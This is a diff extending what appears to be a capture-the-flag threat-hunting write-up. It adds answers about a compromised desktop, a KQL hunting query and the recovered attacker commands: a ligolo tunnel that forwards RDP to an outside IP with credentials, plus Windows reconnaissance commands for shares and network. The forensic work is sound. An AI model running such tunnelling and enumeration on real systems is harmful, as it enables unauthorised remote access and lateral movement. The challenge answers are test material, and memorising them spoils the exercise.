@@ -30,3 +30,27 @@ FileCreationEvents
 | where hostname == "Y1US-DESKTOP"
 | sort by timestamp
 ```
+---------------
+- The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to? ```113.37.9.17```
+- What is the timestamp when the attackers enumerated network shares on the machine? ```2023-12-02T16:51:44Z```
+- What was the hostname of the system the attacker moved laterally to? ```NorthPolefileshare```
+```Kql
+ProcessEvents
+| where hostname == "Y1US-DESKTOP"
+| where timestamp >= datetime("2023-12-02T10:12:42Z")
+| where parent_process_hash == "614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f"
+```
+```
+"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
+netstat
+ipconfig
+arp -a
+netstat -an
+nbtstat-n
+net view /DOMAIN
+net share
+net use
+net config
+systeminfo
+"C:\Users\alsnowball\AppData\Local\Microsoft\Teams\current\Teams.exe" --type=relauncher --no-sandbox --- 
+```
